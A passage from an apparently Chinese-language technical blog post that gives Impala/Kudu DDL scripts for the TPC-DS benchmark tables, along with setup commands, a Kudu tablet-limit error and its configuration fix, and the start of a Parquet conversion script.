PARTITIONS 64</span><br><span class="line">STORED AS KUDU;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create database if not exists kudu_spark_tpcds_1000;</span><br><span class="line">use kudu_spark_tpcds_1000;</span><br><span class="line"></span><br><span class="line">drop table if exists customer_address;</span><br><span class="line"></span><br><span class="line">create table customer_address</span><br><span class="line">(</span><br><span class="line">    ca_address_sk             bigint,</span><br><span class="line">    ca_address_id             string,</span><br><span class="line">    ca_street_number          string,</span><br><span class="line">    ca_street_name            string,</span><br><span class="line">    ca_street_type            string,</span><br><span class="line">    ca_suite_number           string,</span><br><span class="line">    ca_city                   string,</span><br><span class="line">    ca_county                 string,</span><br><span class="line">    ca_state                  string,</span><br><span class="line">    ca_zip                    string,</span><br><span class="line">    ca_country                string,</span><br><span class="line">    ca_gmt_offset             double,</span><br><span class="line">    ca_location_type          string</span><br><span class="line">,PRIMARY KEY(ca_address_sk)</span><br><span class="line">)</span><br><span class="line">PARTITION BY HASH (ca_address_sk) PARTITIONS 6</span><br><span class="line">STORED AS KUDU;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create database if not exists kudu_spark_tpcds_1000;</span><br><span class="line">use kudu_spark_tpcds_1000;</span><br><span class="line"></span><br><span class="line">drop table if exists customer_demographics;</span><br><span class="line"></span><br><span class="line">create table customer_demographics</span><br><span class="line">(</span><br><span class="line">    cd_demo_sk                bigint,</span><br><span class="line">    cd_gender                 string,</span><br><span class="line">    cd_marital_status         string,</span><br><span class="line">    cd_education_status       string,</span><br><span class="line">    cd_purchase_estimate      int,</span><br><span class="line">    cd_credit_rating          string,</span><br><span class="line">    cd_dep_count              int,</span><br><span class="line">    cd_dep_employed_count     int,</span><br><span class="line">    cd_dep_college_count      int </span><br><span class="line">,PRIMARY KEY(cd_demo_sk)</span><br><span class="line">)</span><br><span class="line">PARTITION BY HASH (cd_demo_sk) PARTITIONS 2</span><br><span class="line">STORED AS KUDU;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create database if not exists kudu_spark_tpcds_1000;</span><br><span class="line">use kudu_spark_tpcds_1000;</span><br><span class="line"></span><br><span class="line">drop table if exists customer;</span><br><span class="line"></span><br><span class="line">create table customer</span><br><span class="line">(</span><br><span class="line">    c_customer_sk             bigint,</span><br><span class="line">    c_customer_id             string,</span><br><span class="line">    c_current_cdemo_sk        bigint,</span><br><span class="line">    c_current_hdemo_sk        bigint,</span><br><span class="line">    c_current_addr_sk         bigint,</span><br><span class="line">    c_first_shipto_date_sk    bigint,</span><br><span class="line">    c_first_sales_date_sk     bigint,</span><br><span class="line">    c_salutation              string,</span><br><span class="line">    c_first_name              string,</span><br><span class="line">    c_last_name               string,</span><br><span class="line">    c_preferred_cust_flag     string,</span><br><span class="line">    c_birth_day               int,</span><br><span class="line">    c_birth_month             int,</span><br><span class="line">    c_birth_year              int,</span><br><span class="line">    c_birth_country           string,</span><br><span class="line">    c_login                   string,</span><br><span class="line">    c_email_address           string,</span><br><span class="line">    c_last_review_date        string</span><br><span class="line">,PRIMARY KEY(c_customer_sk)</span><br><span class="line">)</span><br><span class="line">PARTITION BY HASH (c_customer_sk) PARTITIONS 8</span><br><span class="line">STORED AS KUDU;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create database if not exists kudu_spark_tpcds_1000;</span><br><span class="line">use kudu_spark_tpcds_1000;</span><br><span class="line"></span><br><span class="line">drop table if exists date_dim;</span><br><span class="line"></span><br><span class="line">create table date_dim</span><br><span class="line">(</span><br><span class="line">    d_date_sk                 bigint,</span><br><span class="line">    d_date_id                 string,</span><br><span class="line">    d_date                    string,</span><br><span class="line">    d_month_seq               int,</span><br><span class="line">    d_week_seq                int,</span><br><span class="line">    d_quarter_seq             int,</span><br><span class="line">    d_year                    int,</span><br><span class="line">    d_dow                     int,</span><br><span class="line">    d_moy                     int,</span><br><span class="line">    d_dom                     int,</span><br><span class="line">    d_qoy                     int,</span><br><span class="line">    d_fy_year                 int,</span><br><span class="line">    d_fy_quarter_seq          int,</span><br><span class="line">    d_fy_week_seq             int,</span><br><span class="line">    d_day_name                string,</span><br><span class="line">    d_quarter_name            string,</span><br><span class="line">    d_holiday                 string,</span><br><span class="line">    d_weekend                 string,</span><br><span class="line">    d_following_holiday       string,</span><br><span class="line">    d_first_dom               int,</span><br><span class="line">    d_last_dom                int,</span><br><span class="line">    d_same_day_ly             int,</span><br><span class="line">    d_same_day_lq             int,</span><br><span class="line">    d_current_day             string,</span><br><span class="line">    d_current_week            string,</span><br><span class="line">    d_current_month           string,</span><br><span class="line">    d_current_quarter         string,</span><br><span class="line">    d_current_year            string </span><br><span class="line">,PRIMARY KEY(d_date_sk)</span><br><span class="line">)</span><br><span class="line">PARTITION BY HASH (d_date_sk) PARTITIONS 2</span><br><span class="line">STORED AS KUDU;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create database if not exists kudu_spark_tpcds_1000;</span><br><span class="line">use kudu_spark_tpcds_1000;</span><br><span class="line"></span><br><span class="line">drop table if exists household_demographics;</span><br><span class="line"></span><br><span class="line">create table household_demographics</span><br><span class="line">(</span><br><span class="line">    hd_demo_sk                bigint,</span><br><span class="line">    hd_income_band_sk         bigint,</span><br><span class="line">    hd_buy_potential          string,</span><br><span class="line">    hd_dep_count              int,</span><br><span class="line">    hd_vehicle_count          int</span><br><span class="line">,PRIMARY KEY(hd_demo_sk)</span><br><span class="line">)</span><br><span class="line">PARTITION BY HASH (hd_demo_sk) PARTITIONS 2</span><br><span class="line">STORED AS KUDU;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create database if not exists kudu_spark_tpcds_1000;</span><br><span class="line">use kudu_spark_tpcds_1000;</span><br><span class="line"></span><br><span class="line">drop table if exists income_band;</span><br><span class="line"></span><br><span class="line">create table income_band(</span><br><span class="line">      ib_income_band_sk         bigint               </span><br><span class="line">,     ib_lower_bound            int                       </span><br><span class="line">,     ib_upper_bound            int</span><br><span class="line">,PRIMARY KEY(ib_income_band_sk)</span><br><span class="line">)</span><br><span class="line">PARTITION BY HASH (ib_income_band_sk) PARTITIONS 2</span><br><span class="line">STORED AS KUDU;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create database if not exists kudu_spark_tpcds_1000;</span><br><span class="line">use kudu_spark_tpcds_1000;</span><br><span class="line"></span><br><span class="line">drop table if exists inventory;</span><br><span class="line"></span><br><span class="line">create table inventory</span><br><span class="line">(</span><br><span class="line">    inv_date_skbigint,</span><br><span class="line">    inv_item_skbigint,</span><br><span class="line">    inv_warehouse_skbigint,</span><br><span class="line">    inv_quantity_on_handint</span><br><span class="line">,PRIMARY KEY(inv_date_sk)</span><br><span class="line">)</span><br><span class="line">PARTITION BY HASH (inv_date_sk) PARTITIONS 12</span><br><span class="line">STORED AS KUDU;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create database if not exists kudu_spark_tpcds_1000;</span><br><span class="line">use kudu_spark_tpcds_1000;</span><br><span class="line"></span><br><span class="line">drop table if exists item;</span><br><span class="line"></span><br><span class="line">create table item</span><br><span class="line">(</span><br><span class="line">    i_item_sk                 bigint,</span><br><span class="line">    i_item_id                 string,</span><br><span class="line">    i_rec_start_date          string,</span><br><span class="line">    i_rec_end_date            string,</span><br><span class="line">    i_item_desc               string,</span><br><span class="line">    i_current_price           double,</span><br><span class="line">    i_wholesale_cost          double,</span><br><span class="line">    i_brand_id                int,</span><br><span class="line">    i_brand                   string,</span><br><span class="line">    i_class_id                int,</span><br><span class="line">    i_class                   string,</span><br><span class="line">    i_category_id             int,</span><br><span class="line">    i_category                string,</span><br><span class="line">    i_manufact_id             int,</span><br><span class="line">    i_manufact                string,</span><br><span class="line">    i_size                    string,</span><br><span class="line">    i_formulation             string,</span><br><span class="line">    i_color                   string,</span><br><span class="line">    i_units                   string,</span><br><span class="line">    i_container               string,</span><br><span class="line">    i_manager_id              int,</span><br><span class="line">    i_product_name            string</span><br><span class="line">,PRIMARY KEY(i_item_sk)</span><br><span class="line">)</span><br><span class="line">PARTITION BY HASH (i_item_sk) PARTITIONS 4</span><br><span class="line">STORED AS KUDU;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create database if not exists kudu_spark_tpcds_1000;</span><br><span class="line">use kudu_spark_tpcds_1000;</span><br><span class="line"></span><br><span class="line">drop table if exists promotion;</span><br><span class="line"></span><br><span class="line">create table promotion</span><br><span class="line">(</span><br><span class="line">    p_promo_sk                bigint,</span><br><span class="line">    p_promo_id                string,</span><br><span class="line">    p_start_date_sk           bigint,</span><br><span class="line">    p_end_date_sk             bigint,</span><br><span class="line">    p_item_sk                 bigint,</span><br><span class="line">    p_cost                    double,</span><br><span class="line">    p_response_target         int,</span><br><span class="line">    p_promo_name              string,</span><br><span class="line">    p_channel_dmail           string,</span><br><span class="line">    p_channel_email           string,</span><br><span class="line">    p_channel_catalog         string,</span><br><span class="line">    p_channel_tv              string,</span><br><span class="line">    p_channel_radio           string,</span><br><span class="line">    p_channel_press           string,</span><br><span class="line">    p_channel_event           string,</span><br><span class="line">    p_channel_demo            string,</span><br><span class="line">    p_channel_details         string,</span><br><span class="line">    p_purpose                 string,</span><br><span class="line">    p_discount_active         string </span><br><span class="line">,PRIMARY KEY(p_promo_sk)</span><br><span class="line">)</span><br><span class="line">PARTITION BY HASH (p_promo_sk) PARTITIONS 2</span><br><span class="line">STORED AS KUDU;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create database if not exists kudu_spark_tpcds_1000;</span><br><span class="line">use kudu_spark_tpcds_1000;</span><br><span class="line"></span><br><span class="line">drop table if exists reason;</span><br><span class="line"></span><br><span class="line">create table reason(</span><br><span class="line">      r_reason_sk               bigint               </span><br><span class="line">,     r_reason_id               string              </span><br><span class="line">,     r_reason_desc             string                </span><br><span class="line">,PRIMARY KEY(r_reason_sk)</span><br><span class="line">)</span><br><span class="line">PARTITION BY HASH (r_reason_sk) PARTITIONS 2</span><br><span class="line">STORED AS KUDU;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create database if not exists kudu_spark_tpcds_1000;</span><br><span class="line">use kudu_spark_tpcds_1000;</span><br><span class="line"></span><br><span class="line">drop table if exists ship_mode;</span><br><span class="line"></span><br><span class="line">create table ship_mode(</span><br><span class="line">      sm_ship_mode_sk           bigint               </span><br><span class="line">,     sm_ship_mode_id           string              </span><br><span class="line">,     sm_type                   string                      </span><br><span class="line">,     sm_code                   string                      </span><br><span class="line">,     sm_carrier                string                      </span><br><span class="line">,     sm_contract               string                      </span><br><span class="line">,PRIMARY KEY(sm_ship_mode_sk)</span><br><span class="line">)</span><br><span class="line">PARTITION BY HASH (sm_ship_mode_sk) PARTITIONS 2</span><br><span class="line">STORED AS KUDU;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create database if not exists kudu_spark_tpcds_1000;</span><br><span class="line">use kudu_spark_tpcds_1000;</span><br><span class="line"></span><br><span class="line">drop table if exists store_returns;</span><br><span class="line"></span><br><span class="line">create table store_returns</span><br><span class="line">(</span><br><span class="line">    sr_item_sk                bigint,</span><br><span class="line">    sr_returned_date_sk       bigint,</span><br><span class="line">    sr_return_time_sk         bigint,</span><br><span class="line">    sr_customer_sk            bigint,</span><br><span class="line">    sr_cdemo_sk               bigint,</span><br><span class="line">    sr_hdemo_sk               bigint,</span><br><span class="line">    sr_addr_sk                bigint,</span><br><span class="line">    sr_store_sk               bigint,</span><br><span class="line">    sr_reason_sk              bigint,</span><br><span class="line">    sr_ticket_number          bigint,</span><br><span class="line">    sr_return_quantity        int,</span><br><span class="line">    sr_return_amt             double,</span><br><span class="line">    sr_return_tax             double,</span><br><span class="line">    sr_return_amt_inc_tax     double,</span><br><span class="line">    sr_fee                    double,</span><br><span class="line">    sr_return_ship_cost       double,</span><br><span class="line">    sr_refunded_cash          double,</span><br><span class="line">    sr_reversed_charge        double,</span><br><span class="line">    sr_store_credit           double,</span><br><span class="line">    sr_net_loss               double,</span><br><span class="line">PRIMARY KEY(sr_item_sk)</span><br><span class="line">)</span><br><span class="line">PARTITION BY HASH PARTITIONS 32</span><br><span class="line">STORED AS KUDU;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create database if not exists kudu_spark_tpcds_1000;</span><br><span class="line">use kudu_spark_tpcds_1000;</span><br><span class="line"></span><br><span class="line">drop table if exists store_sales;</span><br><span class="line"></span><br><span class="line">create table store_sales</span><br><span class="line">(</span><br><span class="line">    ss_item_sk                bigint,</span><br><span class="line">    ss_sold_date_sk           bigint,</span><br><span class="line">    ss_sold_time_sk           bigint,</span><br><span class="line">    ss_customer_sk            bigint,</span><br><span class="line">    ss_cdemo_sk               bigint,</span><br><span class="line">    ss_hdemo_sk               bigint,</span><br><span class="line">    ss_addr_sk                bigint,</span><br><span class="line">    ss_store_sk               bigint,</span><br><span class="line">    ss_promo_sk               bigint,</span><br><span class="line">    ss_ticket_number          bigint,</span><br><span class="line">    ss_quantity               int,</span><br><span class="line">    ss_wholesale_cost         double,</span><br><span class="line">    ss_list_price             double,</span><br><span class="line">    ss_sales_price            double,</span><br><span class="line">    ss_ext_discount_amt       double,</span><br><span class="line">    ss_ext_sales_price        double,</span><br><span class="line">    ss_ext_wholesale_cost     double,</span><br><span class="line">    ss_ext_list_price         double,</span><br><span class="line">    ss_ext_tax                double,</span><br><span class="line">    ss_coupon_amt             double,</span><br><span class="line">    ss_net_paid               double,</span><br><span class="line">    ss_net_paid_inc_tax       double,</span><br><span class="line">    ss_net_profit             double                  </span><br><span class="line">,PRIMARY KEY(ss_item_sk)</span><br><span class="line">)</span><br><span class="line">PARTITION BY HASH (ss_item_sk) PARTITIONS 96</span><br><span class="line">STORED AS KUDU;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create database if not exists kudu_spark_tpcds_1000;</span><br><span class="line">use kudu_spark_tpcds_1000;</span><br><span class="line"></span><br><span class="line">drop table if exists store;</span><br><span class="line"></span><br><span class="line">create table store</span><br><span class="line">(</span><br><span class="line">    s_store_sk                bigint,</span><br><span class="line">    s_store_id                string,</span><br><span class="line">    s_rec_start_date          string,</span><br><span class="line">    s_rec_end_date            string,</span><br><span class="line">    s_closed_date_sk          bigint,</span><br><span class="line">    s_store_name              string,</span><br><span class="line">    s_number_employees        int,</span><br><span class="line">    s_floor_space             int,</span><br><span class="line">    s_hours                   string,</span><br><span class="line">    s_manager                 string,</span><br><span class="line">    s_market_id               int,</span><br><span class="line">    s_geography_class         string,</span><br><span class="line">    s_market_desc             string,</span><br><span class="line">    s_market_manager          string,</span><br><span class="line">    s_division_id             int,</span><br><span class="line">    s_division_name           string,</span><br><span class="line">    s_company_id              int,</span><br><span class="line">    s_company_name            string,</span><br><span class="line">    s_street_number           string,</span><br><span class="line">    s_street_name             string,</span><br><span class="line">    s_street_type             string,</span><br><span class="line">    s_suite_number            string,</span><br><span class="line">    s_city                    string,</span><br><span class="line">    s_county                  string,</span><br><span class="line">    s_state                   string,</span><br><span class="line">    s_zip                     string,</span><br><span class="line">    s_country                 string,</span><br><span class="line">    s_gmt_offset              double,</span><br><span class="line">    s_tax_precentage          double                  </span><br><span class="line">,PRIMARY KEY(s_store_sk)</span><br><span class="line">)</span><br><span class="line">PARTITION BY HASH (s_store_sk) PARTITIONS 2</span><br><span class="line">STORED AS KUDU;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create database if not exists kudu_spark_tpcds_1000;</span><br><span class="line">use kudu_spark_tpcds_1000;</span><br><span class="line"></span><br><span class="line">drop table if exists time_dim;</span><br><span class="line"></span><br><span class="line">create table time_dim</span><br><span class="line">(</span><br><span class="line">    t_time_sk                 bigint,</span><br><span class="line">    t_time_id                 string,</span><br><span class="line">    t_time                    int,</span><br><span class="line">    t_hour                    int,</span><br><span class="line">    t_minute                  int,</span><br><span class="line">    t_second                  int,</span><br><span class="line">    t_am_pm                   string,</span><br><span class="line">    t_shift                   string,</span><br><span class="line">    t_sub_shift               string,</span><br><span class="line">    t_meal_time               string</span><br><span class="line">,PRIMARY KEY(t_time_sk)</span><br><span class="line">)</span><br><span class="line">PARTITION BY HASH (t_time_sk) PARTITIONS 2</span><br><span class="line">STORED AS KUDU;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create database if not exists kudu_spark_tpcds_1000;</span><br><span class="line">use kudu_spark_tpcds_1000;</span><br><span class="line"></span><br><span class="line">drop table if exists warehouse;</span><br><span class="line"></span><br><span class="line">create table warehouse(</span><br><span class="line">      w_warehouse_sk            bigint               </span><br><span class="line">,     w_warehouse_id            string              </span><br><span class="line">,     w_warehouse_name          string                   </span><br><span class="line">,     w_warehouse_sq_ft         int                       </span><br><span class="line">,     w_street_number           string                      </span><br><span class="line">,     w_street_name             string                   </span><br><span class="line">,     w_street_type             string                      </span><br><span class="line">,     w_suite_number            string                      </span><br><span class="line">,     w_city                    string                   </span><br><span class="line">,     w_county                  string                   </span><br><span class="line">,     w_state                   string                       </span><br><span class="line">,     w_zip                     string                      </span><br><span class="line">,     w_country                 string                   </span><br><span class="line">,     w_gmt_offset              double                  </span><br><span class="line">,PRIMARY KEY(w_warehouse_sk)</span><br><span class="line">)</span><br><span class="line">PARTITION BY HASH (w_warehouse_sk) PARTITIONS 2</span><br><span class="line">STORED AS KUDU;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create database if not exists kudu_spark_tpcds_1000;</span><br><span class="line">use kudu_spark_tpcds_1000;</span><br><span class="line"></span><br><span class="line">drop table if exists web_page;</span><br><span class="line"></span><br><span class="line">create table web_page(</span><br><span class="line">      wp_web_page_sk            bigint               </span><br><span class="line">,     wp_web_page_id            string              </span><br><span class="line">,     wp_rec_start_date        string                         </span><br><span class="line">,     wp_rec_end_date          string                         </span><br><span class="line">,     wp_creation_date_sk       bigint                       </span><br><span class="line">,     wp_access_date_sk         bigint                       </span><br><span class="line">,     wp_autogen_flag           string                       </span><br><span class="line">,     wp_customer_sk            bigint                       </span><br><span class="line">,     wp_url                    string                  </span><br><span class="line">,     wp_type                   string                      </span><br><span class="line">,     wp_char_count             int                       </span><br><span class="line">,     wp_link_count             int                       </span><br><span class="line">,     wp_image_count            int                       </span><br><span class="line">,     wp_max_ad_count           int</span><br><span class="line">,PRIMARY KEY(wp_web_page_sk)</span><br><span class="line">)</span><br><span class="line">PARTITION BY HASH (wp_web_page_sk) PARTITIONS 2</span><br><span class="line">STORED AS KUDU;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create database if not exists kudu_spark_tpcds_1000;</span><br><span class="line">use kudu_spark_tpcds_1000;</span><br><span class="line"></span><br><span class="line">drop table if exists web_returns;</span><br><span class="line"></span><br><span class="line">create table web_returns</span><br><span class="line">(</span><br><span class="line">    wr_item_sk                bigint,</span><br><span class="line">    wr_returned_date_sk       bigint,</span><br><span class="line">    wr_returned_time_sk       bigint,</span><br><span class="line">    wr_refunded_customer_sk   bigint,</span><br><span class="line">    wr_refunded_cdemo_sk      bigint,</span><br><span class="line">    wr_refunded_hdemo_sk      bigint,</span><br><span class="line">    wr_refunded_addr_sk       bigint,</span><br><span class="line">    wr_returning_customer_sk  bigint,</span><br><span class="line">    wr_returning_cdemo_sk     bigint,</span><br><span class="line">    wr_returning_hdemo_sk     bigint,</span><br><span class="line">    wr_returning_addr_sk      bigint,</span><br><span class="line">    wr_web_page_sk            bigint,</span><br><span class="line">    wr_reason_sk              bigint,</span><br><span class="line">    wr_order_number           bigint,</span><br><span class="line">    wr_return_quantity        int,</span><br><span class="line">    wr_return_amt             double,</span><br><span class="line">    wr_return_tax             double,</span><br><span class="line">    wr_return_amt_inc_tax     double,</span><br><span class="line">    wr_fee                    double,</span><br><span class="line">    wr_return_ship_cost       double,</span><br><span class="line">    wr_refunded_cash          double,</span><br><span class="line">    wr_reversed_charge        double,</span><br><span class="line">    wr_account_credit         double,</span><br><span class="line">    wr_net_loss               double</span><br><span class="line">,PRIMARY KEY(wr_item_sk)</span><br><span class="line">)</span><br><span class="line">PARTITION BY HASH (wr_item_sk) PARTITIONS 8</span><br><span class="line">STORED AS KUDU;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create database if not exists kudu_spark_tpcds_1000;</span><br><span class="line">use kudu_spark_tpcds_1000;</span><br><span class="line"></span><br><span class="line">drop table if exists web_sales;</span><br><span class="line"></span><br><span class="line">create table web_sales</span><br><span class="line">(</span><br><span class="line">    ws_item_sk                bigint,</span><br><span class="line">    ws_sold_date_sk           bigint,</span><br><span class="line">    ws_sold_time_sk           bigint,</span><br><span class="line">    ws_ship_date_sk           bigint,</span><br><span class="line">    ws_bill_customer_sk       bigint,</span><br><span class="line">    ws_bill_cdemo_sk          bigint,</span><br><span class="line">    ws_bill_hdemo_sk          bigint,</span><br><span class="line">    ws_bill_addr_sk           bigint,</span><br><span class="line">    ws_ship_customer_sk       bigint,</span><br><span class="line">    ws_ship_cdemo_sk          bigint,</span><br><span class="line">    ws_ship_hdemo_sk          bigint,</span><br><span class="line">    ws_ship_addr_sk           bigint,</span><br><span class="line">    ws_web_page_sk            bigint,</span><br><span class="line">    ws_web_site_sk            bigint,</span><br><span class="line">    ws_ship_mode_sk           bigint,</span><br><span class="line">    ws_warehouse_sk           bigint,</span><br><span class="line">    ws_promo_sk               bigint,</span><br><span class="line">    ws_order_number           bigint,</span><br><span class="line">    ws_quantity               int,</span><br><span class="line">    ws_wholesale_cost         double,</span><br><span class="line">    ws_list_price             double,</span><br><span class="line">    ws_sales_price            double,</span><br><span class="line">    ws_ext_discount_amt       double,</span><br><span class="line">    ws_ext_sales_price        double,</span><br><span class="line">    ws_ext_wholesale_cost     double,</span><br><span class="line">    ws_ext_list_price         double,</span><br><span class="line">    ws_ext_tax                double,</span><br><span class="line">    ws_coupon_amt             double,</span><br><span class="line">    ws_ext_ship_cost          double,</span><br><span class="line">    ws_net_paid               double,</span><br><span class="line">    ws_net_paid_inc_tax       double,</span><br><span class="line">    ws_net_paid_inc_ship      double,</span><br><span class="line">    ws_net_paid_inc_ship_tax  double,</span><br><span class="line">    ws_net_profit             double</span><br><span class="line">,PRIMARY KEY(ws_item_sk)</span><br><span class="line">)</span><br><span class="line">PARTITION BY HASH (ws_item_sk) PARTITIONS 64</span><br><span class="line">STORED AS KUDU;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create database if not exists kudu_spark_tpcds_1000;</span><br><span class="line">use kudu_spark_tpcds_1000;</span><br><span class="line"></span><br><span class="line">drop table if exists web_site;</span><br><span class="line"></span><br><span class="line">create table web_site</span><br><span class="line">(</span><br><span class="line">    web_site_sk           bigint,</span><br><span class="line">    web_site_id           string,</span><br><span class="line">    web_rec_start_date    string,</span><br><span class="line">    web_rec_end_date      string,</span><br><span class="line">    web_name              string,</span><br><span class="line">    web_open_date_sk      bigint,</span><br><span class="line">    web_close_date_sk     bigint,</span><br><span class="line">    web_class             string,</span><br><span class="line">    web_manager           string,</span><br><span class="line">    web_mkt_id            int,</span><br><span class="line">    web_mkt_class         string,</span><br><span class="line">    web_mkt_desc          string,</span><br><span class="line">    web_market_manager    string,</span><br><span class="line">    web_company_id        int,</span><br><span class="line">    web_company_name      string,</span><br><span class="line">    web_street_number     string,</span><br><span class="line">    web_street_name       string,</span><br><span class="line">    web_street_type       string,</span><br><span class="line">    web_suite_number      string,</span><br><span class="line">    web_city              string,</span><br><span class="line">    web_county            string,</span><br><span class="line">    web_state             string,</span><br><span class="line">    web_zip               string,</span><br><span class="line">    web_country           string,</span><br><span class="line">    web_gmt_offset        double,</span><br><span class="line">    web_tax_percentage    double</span><br><span class="line">,PRIMARY KEY(web_site_sk)</span><br><span class="line">)</span><br><span class="line">PARTITION BY HASH (web_site_sk) PARTITIONS 2</span><br><span class="line">STORED AS KUDU;</span><br></pre></td></tr></table></figure><p>命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impala-shell -f impala-shell</span><br></pre></td></tr></table></figure><p>Tips：可能会遇到这样的错误</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ERROR: ImpalaRuntimeException: Error creating Kudu table 'impala::kudu_spark_tpcds_2.catalog_sales'</span><br><span class="line">CAUSED BY: NonRecoverableException: The requested number of tablets is over the maximum permitted at creation time (60). Additional tablets may be added by adding range partitions to the table post-creation.</span><br></pre></td></tr></table></figure><p>原因：</p><p><code>Kudu</code>默认配置最多分区被限制了，需要配置</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3azpwvi62j21c10k9ta6.jpg" alt></p><p>如图栏目里，配置</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--max_create_tablets_per_ts=30</span><br></pre></td></tr></table></figure><p>生成日志后</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tail q* -n 1 &gt;&gt; kudu_time_2.log</span><br></pre></td></tr></table></figure><p>–</p><p>–</p><p>–</p><p>不知道为什么，<code>impala+kudu</code>对内存的管理存在一些问题，明明物理内存足够使用，却老是会用上交换内存。</p><p>测试性能下降，这里取消交换内存再试一次</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 取消交换内存：</span><br><span class="line">swapoff -a</span><br><span class="line">swapon -a</span><br></pre></td></tr></table></figure><p>parquet表格生成脚本  <code>alltables_parquet.sql</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">database</span> <span class="keyword">if</span> <span class="keyword">exists</span> $&#123;<span class="keyword">VAR</span>:DB&#125; <span class="keyword">cascade</span>;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> $&#123;<span class="keyword">VAR</span>:DB&#125;;</span><br><span class="line"><span class="keyword">use</span> $&#123;<span class="keyword">VAR</span>:DB&#125;;</span><br><span class="line"><span class="keyword">set</span> parquet_file_size=<span class="number">512</span>M;</span><br><span class="line"><span class="keyword">set</span> COMPRESSION_CODEC=snappy;</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> call_center;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> $&#123;<span class="keyword">VAR</span>:DB&#125;.call_center</span><br><span class="line"><span class="keyword">stored</span> <span class="keyword">as</span> parquet</span><br><span class="line"><span class="keyword">as</span> <span class="keyword">select</span> * <span class="keyword">from</span> $&#123;<span class="keyword">VAR</span>:HIVE_DB&#125;.call_center;</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> catalog_page;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> $&#123;<span class="keyword">VAR</span>:DB&#125;.catalog_page</span><br><span class="line"><span class="keyword">stored</span> <span class="keyword">as</span> parquet</span><br><span class="line"><span class="keyword">as</span> <span class="keyword">select</span> * <span class="keyword">from</span> $&#123;<span class="keyword">VAR</span>:HIVE_DB&#125;.catalog_page;</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> catalog_returns;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> $&#123;<span class="keyword">VAR</span>:DB&#125;.catalog_returns</span><br><span class="line"><span 